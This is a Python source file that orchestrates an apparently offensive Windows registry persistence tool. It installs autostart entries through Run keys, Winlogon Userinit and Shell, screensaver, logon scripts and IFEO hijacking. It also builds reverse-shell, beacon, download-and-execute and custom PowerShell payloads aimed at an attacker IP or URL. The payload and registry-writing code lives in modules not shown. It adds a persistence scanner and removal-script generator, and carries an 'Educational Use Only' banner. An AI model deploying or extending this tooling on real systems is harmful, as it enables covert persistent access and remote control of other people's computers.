"""
Main orchestrator for Registry Persistence Framework
Coordinates all persistence methods and operations
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import check_admin
from config import PERSISTENCE_METHODS
from methods.run_keys import RunKeyPersistence
from methods.winlogon import WinlogonPersistence
from methods.screensaver import ScreensaverPersistence
from methods.logon_script import LogonScriptPersistence
from methods.ifeo import IFEOPersistence
from payload.generator import PayloadGenerator
from detection.checker import PersistenceChecker
from output.removal import RemovalScriptGenerator


class RegistryPersistenceOrchestrator:
    """
    Main orchestrator class that coordinates all persistence operations
    """
    
    def __init__(self):
        self.is_admin = check_admin()
        self.methods_info = PERSISTENCE_METHODS
        
        # Initialize all method handlers
        self.run_keys = RunKeyPersistence()
        self.winlogon = WinlogonPersistence()
        self.screensaver = ScreensaverPersistence()
        self.logon_script = LogonScriptPersistence()
        self.ifeo = IFEOPersistence()
        
        # Initialize utilities
        self.payload_gen = PayloadGenerator()
        self.checker = PersistenceChecker()
        self.removal_gen = RemovalScriptGenerator()
        
        # Track installed methods
        self.installed_methods = []
    
    def display_banner(self):
        """Display framework banner"""
        banner = """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║        WINDOWS REGISTRY PERSISTENCE FRAMEWORK             ║
║               Educational Use Only                        ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
"""
        print(banner)
        
        if self.is_admin:
            print("[+] Running with Administrator privileges")
        else:
            print("[!] Running with standard user privileges")
            print("    (Some methods require Administrator)")
        print()
    
    def list_methods(self):
        """Display all available persistence methods"""
        print("\n" + "="*60)
        print("AVAILABLE PERSISTENCE METHODS")
        print("="*60 + "\n")
        
        for method_id, info in self.methods_info.items():
            admin_req = "Yes" if info['requires_admin'] else "No"
            
            print(f"[{method_id.upper()}]")
            print(f"  Name: {info['name']}")
            print(f"  Description: {info['description']}")
            print(f"  Location: {info['location']}")
            print(f"  Trigger: {info['trigger']}")
            print(f"  Admin Required: {admin_req}")
            print(f"  Detection: {info['detection_difficulty']}")
            print(f"  Survives Reboot: {info['survives_reboot']}")
            print()
    
    def install_method(self, method_name, payload_path, **kwargs):
        """
        Install a specific persistence method
        
        Args:
            method_name (str): Name of method to install
            payload_path (str): Path to payload
            **kwargs: Additional method-specific arguments
            
        Returns:
            dict: Installation result
        """
        print(f"\n[*] Installing method: {method_name}")
        print("="*60)
        
        result = None
        
        if method_name == 'run_key':
            result = self.run_keys.install_hkcu_run(
                payload_path, 
                kwargs.get('name')
            )
        
        elif method_name == 'run_key_local_machine':
            result = self.run_keys.install_hklm_run(
                payload_path,
                kwargs.get('name')
            )
        
        elif method_name == 'run_once_key':
            result = self.run_keys.install_runonce(
                payload_path,
                kwargs.get('name'),
                kwargs.get('hklm', False)
            )
        
        elif method_name == 'winlogon_userinit':
            result = self.winlogon.install_userinit(payload_path)
        
        elif method_name == 'winlogon_shell':
            result = self.winlogon.install_shell(payload_path)
        
        elif method_name == 'screensaver':
            result = self.screensaver.install(
                payload_path,
                kwargs.get('timeout', 60)
            )
        
        elif method_name == 'logon_script':
            result = self.logon_script.install(payload_path)
        
        elif method_name == 'logon_script_powershell':
            result = self.logon_script.install_powershell(payload_path)
        
        elif method_name == 'image_file_execution':
            target_exe = kwargs.get('target_exe')
            if not target_exe:
                print("[!] IFEO method requires --target-exe parameter")
                return None
            result = self.ifeo.install(target_exe, payload_path)
        
        else:
            print(f"[!] Unknown method: {method_name}")
            return None
        
        if result:
            self.installed_methods.append(result)
        
        return result
    
    def install_multiple(self, method_names, payload_path):
        """
        Install multiple persistence methods
        
        Args:
            method_names (list): List of method names
            payload_path (str): Path to payload
            
        Returns:
            list: List of successful installations
        """
        print("\n" + "="*60)
        print("INSTALLING MULTIPLE PERSISTENCE METHODS")
        print("="*60)
        print(f"Methods: {', '.join(method_names)}")
        print(f"Payload: {payload_path}")
        print("="*60 + "\n")
        
        successful = []
        
        for method_name in method_names:
            result = self.install_method(method_name, payload_path)
            if result:
                successful.append(result)
            print()
        
        # Generate removal script
        if successful:
            print("\n" + "="*60)
            print(f"[+] Successfully installed {len(successful)}/{len(method_names)} methods")
            print("="*60 + "\n")
            
            self.removal_gen.generate_removal_script(successful)
            self.removal_gen.generate_report(successful)
        
        return successful
    
    def check_existing_persistence(self):
        """Scan for existing persistence mechanisms"""
        return self.checker.scan_all()
    
    def create_payload(self, payload_type, **kwargs):
        """
        Create a payload
        
        Args:
            payload_type (str): Type of payload
            **kwargs: Payload-specific arguments
            
        Returns:
            str: Path to created payload
        """
        if payload_type == 'reverse_shell':
            return self.payload_gen.create_reverse_shell(
                kwargs.get('attacker_ip'),
                kwargs.get('attacker_port', 4444)
            )
        elif payload_type == 'beacon':
            return self.payload_gen.create_beacon_payload(
                kwargs.get('beacon_url'),
                kwargs.get('interval', 60)
            )
        elif payload_type == 'download_execute':
            return self.payload_gen.create_download_execute(
                kwargs.get('download_url')
            )
        elif payload_type == 'batch':
            return self.payload_gen.create_batch_payload(
                kwargs.get('command')
            )
        elif payload_type == 'custom':
            return self.payload_gen.create_custom_payload(
                kwargs.get('powershell_code')
            )
        else:
            print(f"[!] Unknown payload type: {payload_type}")
            return None
    
    def generate_removal_script(self):
        """Generate removal script for installed methods"""
        if not self.installed_methods:
            print("[!] No persistence methods have been installed yet")
            return None
        
        return self.removal_gen.generate_removal_script(self.installed_methods)
    
    def generate_report(self):
        """Generate detailed report of installations"""
        if not self.installed_methods:
            print("[!] No persistence methods have been installed yet")
            return None
        
        return self.removal_gen.generate_report(self.installed_methods)